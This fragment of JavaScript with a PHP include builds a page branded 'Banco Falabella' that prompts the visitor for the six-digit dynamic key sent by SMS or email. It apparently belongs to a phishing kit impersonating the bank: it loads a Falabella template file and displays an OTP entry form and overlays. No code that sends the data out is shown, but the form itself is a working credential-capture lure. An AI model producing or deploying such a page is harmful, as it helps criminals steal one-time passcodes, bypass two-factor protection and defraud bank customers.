var my_titulo = 'Banco Falabella';
var falabella_body = `
<div id="frmCelular">
	<div class="etiqueta-destacada" style="margin-bottom: 8px;">
		Ingresa tu Clave dinámica
	</div>

	<span>
		Solo debes ingresar la clave dinámica que te llegará por SMS, correo electrónico o la podrás encontrar a la App
	</span>
	<br>
	<div class="separador"></div>
	<br>
	<input type="password" placeholder="Clave dinámica" name="txtOTP" id="txtOTP" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
	<br><br>
	<button class="btn" type="button" id="btnOTP"> VERIFICAR </button>
</div>
`;

<?php require_once('_plantilla_falabella.php'); ?>


//<script>
	$('#frmCelular,#fondo,#fondo-oscuro').show();